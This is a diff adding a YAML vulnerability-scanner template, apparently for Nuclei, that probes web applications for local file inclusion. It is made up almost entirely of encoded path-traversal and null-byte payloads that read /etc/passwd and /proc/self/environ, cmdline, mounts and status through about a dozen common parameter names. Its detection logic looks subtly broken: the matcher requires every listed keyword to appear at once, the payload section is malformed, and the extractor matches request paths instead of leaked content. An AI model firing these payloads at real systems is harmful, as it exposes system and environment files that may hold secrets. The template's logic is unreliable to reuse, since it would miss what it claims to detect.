@@ -1,0 +1,81 @@
+id: advanced-lfi-all-parameters-bypass
+
+info:
+  name: Advanced Local File Inclusion Detection with Modern Evasion Techniques
+  author: V3nom
+  severity: critical
+  description: |
+    This template detects Local File Inclusion (LFI) vulnerabilities across multiple parameters with advanced payloads using obfuscation and encoding techniques 
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                       # URL encoding
+      - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                               # URL encoding
+      - "{{BaseURL}}/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                 # Null byte bypass with URL encoding
+      - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                           # Null byte bypass with URL encoding
+      - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2fenviron"                                    # Environment variable exposure
+      - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2fstatus"                                     # Process status exposure
+      - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2fcmdline"                                    # Command line exposure
+      - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2fmounts"                                     # Mounted filesystems exposure
+      - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2fattr%2fcurrent"                              # File attributes exposure
+      - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2foom_score"                                  # OOM score exposure
+
+    matchers:
+      - type: word
+        words:
+          - "root:x:"                  # Common LFI payload result
+          - "uid="                     # User ID
+          - "gid="                     # Group ID
+          - "Name:"                    # Process name
+          - "Cmdline:"                 # Command line
+          - "Mounts:"                  # Mounted filesystems
+          - "Attr:"                    # File attributes
+          - "oom_score:"               # OOM score
+        part: body
+        condition: and
+
+    extractors:
+      - type: regex
+        name: LFI Path Extraction
+        group: 1
+        regex: '(../../../../../../../../etc/passwd|../etc/passwd|../../../../../../../../proc/self/(environ|status|cmdline|mounts|attr/current|oom_score))'
+
+    payloads:
+      - "{{BaseURL}}/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                       # Testing 'file' parameter with URL encoding
+      - "{{BaseURL}}/?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                               # Testing 'file' parameter with URL encoding
+      - "{{BaseURL}}/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                 # Null byte bypass
+      - "{{BaseURL}}/?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                           # Null byte bypass
+      - "{{BaseURL}}/?view=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                    # Testing 'view' parameter with URL encoding
+      - "{{BaseURL}}/?view=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                               # Testing 'view' parameter with URL encoding
+      - "{{BaseURL}}/?view=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                 # Null byte bypass
+      - "{{BaseURL}}/?view=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                           # Null byte bypass
+      - "{{BaseURL}}/?path=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                    # Testing 'path' parameter with URL encoding
+      - "{{BaseURL}}/?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                               # Testing 'path' parameter with URL encoding
+      - "{{BaseURL}}/?path=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                 # Null byte bypass
+      - "{{BaseURL}}/?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                           # Null byte bypass
+      - "{{BaseURL}}/?inc=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                     # Testing 'inc' parameter with URL encoding
+      - "{{BaseURL}}/?inc=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                                # Testing 'inc' parameter with URL encoding
+      - "{{BaseURL}}/?inc=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                  # Null byte bypass
+      - "{{BaseURL}}/?inc=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                            # Null byte bypass
+      - "{{BaseURL}}/?include=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                  # Testing 'include' parameter with URL encoding
+      - "{{BaseURL}}/?include=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                           # Testing 'include' parameter with URL encoding
+      - "{{BaseURL}}/?include=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                # Null byte bypass
+      - "{{BaseURL}}/?include=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                         # Null byte bypass
+      - "{{BaseURL}}/?download=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                 # Testing 'download' parameter with URL encoding
+      - "{{BaseURL}}/?download=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                          # Testing 'download' parameter with URL encoding
+      - "{{BaseURL}}/?download=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"               # Null byte bypass
+      - "{{BaseURL}}/?download=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                        # Null byte bypass
+      - "{{BaseURL}}/?template=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                  # Testing 'template' parameter with URL encoding
+      - "{{BaseURL}}/?template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                           # Testing 'template' parameter with URL encoding
+      - "{{BaseURL}}/?template=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                # Null byte bypass
+      - "{{BaseURL}}/?template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                         # Null byte bypass
+      - "{{BaseURL}}/?module=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                    # Testing 'module' parameter with URL encoding
+      - "{{BaseURL}}/?module=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                             # Testing 'module' parameter with URL encoding
+      - "{{BaseURL}}/?module=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                  # Null byte bypass
+      - "{{BaseURL}}/?module=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                           # Null byte bypass
+      - "{{BaseURL}}/?data=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"                      # Testing 'data' parameter with URL encoding
+      - "{{BaseURL}}/?data=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"                                               # Testing 'data' parameter with URL encoding
+      - "{{BaseURL}}/?data=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00"                    # Null byte bypass
+      - "{{BaseURL}}/?data=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"                                            # Null byte bypass
+
